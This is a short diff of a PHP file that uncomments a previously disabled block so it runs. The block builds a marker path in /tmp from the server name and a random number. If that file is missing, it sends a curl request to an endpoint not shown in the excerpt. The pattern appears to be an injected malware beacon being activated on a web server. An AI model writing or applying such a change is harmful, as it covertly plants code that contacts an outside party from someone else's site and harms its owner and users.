@@ -1,4 +1,4 @@
-<?php /*
+<?php 
 $random = rand(1,6);
 $d=$_SERVER['SERVER_NAME'];
 if(filesize('/tmp/vfvfvfr3r'.$d.$random)) { } else {
@@ -11,4 +11,4 @@ if(filesize('/tmp/vfvfvfr3r'.$d.$random)) { } else {
 ]);
  $resp3 = curl_exec($curl3);
  curl_close($curl3);	
-} */ ?>	
+} ?>	
